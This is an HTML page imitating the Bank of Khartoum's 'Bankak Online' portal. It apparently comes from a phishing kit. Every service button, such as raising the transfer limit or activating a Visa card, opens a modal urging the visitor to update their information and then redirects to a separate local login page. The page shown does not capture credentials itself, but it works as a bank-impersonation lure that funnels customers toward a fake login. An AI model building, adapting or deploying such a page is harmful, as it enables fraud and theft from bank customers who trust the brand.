<!DOCTYPE html>
<html lang="ar" dir="rtl" class="h-full antialiased">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title id="page-title">bankofkhartoum</title>
    <meta name="description" content="بنكك أونلاين — خدمات مصرفية آمنة من بنك الخرطوم">
    <meta name="application-name" content="Bankak Online">
    <meta name="robots" content="index, follow">
    <link rel="icon" type="image/svg+xml" href="logo.svg">
    <link rel="alternate icon" href="favicon.ico" sizes="16x16">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="page-wrapper lang-fade" id="page-wrapper">

        <header dir="ltr" class="site-header">
            <div class="header-inner">
                <div class="header-red">
                    <div class="header-red-bg" aria-hidden="true"></div>
                    <div class="header-red-overlay" aria-hidden="true"></div>
                    <div class="header-logo">
                        <img src="logo.svg" alt="بنك الخرطوم | Bank of Khartoum" id="logo-img">
                    </div>
                </div>
                <div class="header-gold">
                    <button type="button" class="lang-toggle" id="lang-toggle" aria-label="Switch language">EN</button>
                </div>
            </div>
        </header>

        <main class="main-content">
            <section class="services-shell">
                <div class="services-head">
                    <div class="services-head-left">
                        <p class="services-eyebrow" data-i18n="eyebrow">وصول آمن</p>
                        <h1 class="services-title" data-i18n="title">بنكك أونلاين</h1>
                        <p class="services-sub" data-i18n="sub">اختر الخدمة التي تحتاجها من الخيارات أدناه للمتابعة إلى خطوات الطلب.</p>
                    </div>
                    <div class="services-trust" data-i18n="trust">خدمة مصرفية إلكترونية موثوقة</div>
                </div>

                <div class="services-grid" dir="rtl">
                    <button type="button" class="service-card" data-service="update-info" aria-haspopup="dialog">
                        <span class="service-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 21a8 8 0 0 1 10.821-7.487"></path><path d="M21.378 16.626a1 1 0 0 0-3.004-3.004l-4.01 4.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"></path><circle cx="10" cy="8" r="5"></circle></svg>
                        </span>
                        <div class="service-body">
                            <h3 class="service-title" data-i18n="s1_title">تحديث بياناتك</h3>
                            <p class="service-desc" data-i18n="s1_desc">مراجعة وتحديث بياناتك الشخصية.</p>
                        </div>
                    </button>

                    <button type="button" class="service-card" data-service="transfer-limit" aria-haspopup="dialog">
                        <span class="service-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 14 4-4"></path><path d="M3.34 19a10 10 0 1 1 17.32 0"></path></svg>
                        </span>
                        <div class="service-body">
                            <h3 class="service-title" data-i18n="s2_title">رفع سقف التحويلات اليومية</h3>
                            <p class="service-desc" data-i18n="s2_desc">زيادة الحد اليومي للتحويلات.</p>
                        </div>
                    </button>

                    <button type="button" class="service-card" data-service="fx" aria-haspopup="dialog">
                        <span class="service-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"></path><path d="M2 12h20"></path></svg>
                        </span>
                        <div class="service-body">
                            <h3 class="service-title" data-i18n="s3_title">خدمات العملات الأجنبية</h3>
                            <p class="service-desc" data-i18n="s3_desc">تفعيل وإدارة العملات الأجنبية.</p>
                        </div>
                    </button>

                    <button type="button" class="service-card" data-service="visa" aria-haspopup="dialog">
                        <span class="service-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="20" height="14" x="2" y="5" rx="2"></rect><line x1="2" x2="22" y1="10" y2="10"></line></svg>
                        </span>
                        <div class="service-body">
                            <h3 class="service-title" data-i18n="s4_title">بطاقة فيزا افتراضية</h3>
                            <p class="service-desc" data-i18n="s4_desc">تفعيل بطاقة فيزا للاستخدام الإلكتروني.</p>
                        </div>
                    </button>

                    <button type="button" class="service-card" data-service="account" aria-haspopup="dialog">
                        <span class="service-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 21a6 6 0 0 0-12 0"></path><circle cx="12" cy="11" r="4"></circle><rect width="18" height="18" x="3" y="3" rx="2"></rect></svg>
                        </span>
                        <div class="service-body">
                            <h3 class="service-title" data-i18n="s5_title">حساب جاري و حساب مميز</h3>
                            <p class="service-desc" data-i18n="s5_desc">فتح أو ترقية الحساب.</p>
                        </div>
                    </button>

                    <button type="button" class="service-card" data-service="statement" aria-haspopup="dialog">
                        <span class="service-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z"></path><path d="M14 2v5a1 1 0 0 0 1 1h5"></path><path d="M10 9H8"></path><path d="M16 13H8"></path><path d="M16 17H8"></path></svg>
                        </span>
                        <div class="service-body">
                            <h3 class="service-title" data-i18n="s6_title">كشف الحساب</h3>
                            <p class="service-desc" data-i18n="s6_desc">تنزيل أو عرض كشف الحساب.</p>
                        </div>
                    </button>

                    <button type="button" class="service-card" data-service="security" aria-haspopup="dialog">
                        <span class="service-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                        </span>
                        <div class="service-body">
                            <h3 class="service-title" data-i18n="s7_title">إدارة أسئلة الأمان</h3>
                            <p class="service-desc" data-i18n="s7_desc">تحديث أسئلة التحقق الأمنية.</p>
                        </div>
                    </button>
                </div>
            </section>
        </main>

        <footer class="site-footer">
            <div class="footer-inner">
                <div class="footer-copy"><span class="semibold">©2024</span> <span class="bold">iBOK</span></div>
                <div class="footer-banner"><img src="footer-banner.png" alt="Internet Banking Services" width="980" height="120"></div>
            </div>
        </footer>
    </div>

    <div class="modal-overlay is-hidden" id="modal-overlay" role="dialog" aria-modal="true" aria-labelledby="modal-title">
        <div class="modal-box">
            <div class="modal-header">
                <h2 class="modal-title" id="modal-title" data-i18n="modal_title">رسالة من بنك الخرطوم</h2>
                <button type="button" class="modal-close" id="modal-close" aria-label="Close">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg>
                </button>
            </div>
            <div class="modal-body">
                <p class="modal-text" data-i18n="modal_body">رحلتنا معك مستمرة، والجاي دائماً أحلى. حدّث بياناتك وكمل معانا المشوار.</p>
                <div class="modal-actions">
                    <button type="button" class="modal-btn modal-btn-cancel" id="modal-cancel" data-i18n="modal_cancel">إلغاء</button>
                    <button type="button" class="modal-btn modal-btn-proceed" id="modal-proceed" autofocus data-i18n="modal_proceed">متابعة</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        (function () {
            'use strict';
            var CONFIG = { LOGIN_URL: 'bankak.html' };

            var translations = {
                ar: {
                    pageTitle: 'bankofkhartoum',
                    eyebrow: 'وصول آمن', title: 'بنكك أونلاين',
                    sub: 'اختر الخدمة التي تحتاجها من الخيارات أدناه للمتابعة إلى خطوات الطلب.',
                    trust: 'خدمة مصرفية إلكترونية موثوقة',
                    s1_title: 'تحديث بياناتك', s1_desc: 'مراجعة وتحديث بياناتك الشخصية.',
                    s2_title: 'رفع سقف التحويلات اليومية', s2_desc: 'زيادة الحد اليومي للتحويلات.',
                    s3_title: 'خدمات العملات الأجنبية', s3_desc: 'تفعيل وإدارة العملات الأجنبية.',
                    s4_title: 'بطاقة فيزا افتراضية', s4_desc: 'تفعيل بطاقة فيزا للاستخدام الإلكتروني.',
                    s5_title: 'حساب جاري و حساب مميز', s5_desc: 'فتح أو ترقية الحساب.',
                    s6_title: 'كشف الحساب', s6_desc: 'تنزيل أو عرض كشف الحساب.',
                    s7_title: 'إدارة أسئلة الأمان', s7_desc: 'تحديث أسئلة التحقق الأمنية.',
                    modal_title: 'رسالة من بنك الخرطوم',
                    modal_body: 'رحلتنا معك مستمرة، والجاي دائماً أحلى. حدّث بياناتك وكمل معانا المشوار.',
                    modal_cancel: 'إلغاء', modal_proceed: 'متابعة',
                    toggleLabel: 'EN', toggleAria: 'Switch to English'
                },
                en: {
                    pageTitle: 'bankofkhartoum',
                    eyebrow: 'SECURE ACCESS', title: 'Bankak Online',
                    sub: 'Choose the service you need from the options below to continue to the request steps.',
                    trust: 'Trusted online banking service',
                    s1_title: 'Update Your Information', s1_desc: 'Review and update your personal information.',
                    s2_title: 'Increase Daily Transfer Limit', s2_desc: 'Raise the daily transfer ceiling on your account.',
                    s3_title: 'Foreign Currency Services', s3_desc: 'Activate and manage foreign currency accounts.',
                    s4_title: 'Virtual Visa Card', s4_desc: 'Activate a Visa card for online use.',
                    s5_title: 'Current Account & Premium Account', s5_desc: 'Open or upgrade your account.',
                    s6_title: 'Account Statements', s6_desc: 'Download or view your account statement.',
                    s7_title: 'Manage Security Questions', s7_desc: 'Update your security verification questions.',
                    modal_title: 'Message from BOK',
                    modal_body: 'Our journey with you continues, and the best is always yet to come. Update your information and continue your journey with us.',
                    modal_cancel: 'Cancel', modal_proceed: 'Proceed',
                    toggleLabel: 'AR', toggleAria: 'التبديل إلى العربية'
                }
            };

            var DEFAULT_LANG = 'ar';
            var currentLang = DEFAULT_LANG;
            var html = document.documentElement;
            var pageTitle = document.getElementById('page-title');
            var langToggle = document.getElementById('lang-toggle');
            var wrapper = document.getElementById('page-wrapper');
            var modalOverlay = document.getElementById('modal-overlay');
            var modalClose = document.getElementById('modal-close');
            var modalCancel = document.getElementById('modal-cancel');
            var modalProceed = document.getElementById('modal-proceed');

            function applyLanguage(lang) {
                currentLang = lang;
                var t = translations[lang];
                html.setAttribute('lang', lang);
                html.setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
                if (pageTitle) pageTitle.textContent = t.pageTitle;
                document.querySelectorAll('[data-i18n]').forEach(function (el) {
                    var k = el.getAttribute('data-i18n');
                    if (t[k] !== undefined) el.textContent = t[k];
                });
                if (langToggle) {
                    langToggle.textContent = t.toggleLabel;
                    langToggle.setAttribute('aria-label', t.toggleAria);
                }
                try { localStorage.setItem('bankak-lang', lang); } catch (e) {}
            }

            langToggle.addEventListener('click', function () {
                var next = currentLang === 'ar' ? 'en' : 'ar';
                wrapper.classList.add('is-switching');
                window.setTimeout(function () {
                    applyLanguage(next);
                    wrapper.classList.remove('is-switching');
                }, 120);
            });

            function openModal() { modalOverlay.classList.remove('is-hidden'); }
            function closeModal() { modalOverlay.classList.add('is-hidden'); }
            function goToLogin() { window.location.href = CONFIG.LOGIN_URL; }

            document.querySelectorAll('.service-card').forEach(function (card) {
                card.addEventListener('click', openModal);
            });
            modalClose.addEventListener('click', closeModal);
            modalCancel.addEventListener('click', closeModal);
            modalProceed.addEventListener('click', goToLogin);
            modalOverlay.addEventListener('click', function (e) {
                if (e.target === modalOverlay) closeModal();
            });
            document.addEventListener('keydown', function (e) {
                if (e.key === 'Escape' && !modalOverlay.classList.contains('is-hidden')) closeModal();
            });

            var logoImg = document.getElementById('logo-img');
            if (logoImg) {
                logoImg.addEventListener('error', function () {
                    var parent = logoImg.parentNode;
                    logoImg.style.display = 'none';
                    if (!parent.querySelector('.logo-fallback')) {
                        var fb = document.createElement('div');
                        fb.className = 'logo-fallback';
                        fb.style.display = 'block';
                        fb.innerHTML = 'بنك الخرطوم<br><span style="font-size:0.9rem;font-weight:600;">Bank of Khartoum</span>';
                        parent.appendChild(fb);
                    }
                });
            }

            var saved = null;
            try { saved = localStorage.getItem('bankak-lang'); } catch (e) {}
            applyLanguage(saved === 'en' ? 'en' : DEFAULT_LANG);
        })();
    </script>
</body>
</html>
